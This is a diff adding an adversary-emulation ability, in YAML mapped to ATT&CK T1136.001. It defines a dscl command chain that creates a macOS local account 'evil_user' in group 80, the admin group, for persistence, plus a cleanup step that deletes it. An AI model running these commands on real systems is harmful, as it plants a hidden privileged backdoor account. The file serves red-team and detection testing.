@@ -1,0 +1,18 @@
+- description: 'Creates a user on a MacOS system with dscl
+
+    '
+  id: 45c73c8b-658b-660d-a5cc-7bb6207bc08f
+  name: Create a user account on a MacOS system
+  platforms:
+    darwin:
+      sh:
+        cleanup: dscl . -delete /Users/evil_user
+        command: dscl . -create /Users/evil_user; dscl . -create /Users/evil_user
+          UserShell /bin/zsh; dscl . -create /Users/evil_user RealName "Evil Account";
+          dscl . -create /Users/evil_user UniqueID "1010"; dscl . -create /Users/evil_user
+          PrimaryGroupID 80; dscl . -create /Users/evil_user NFSHomeDirectory /Users/evil_user
+        payloads: []
+  tactic: persistence
+  technique:
+    attack_id: T1136.001
+    name: 'Create Account: Local Account'
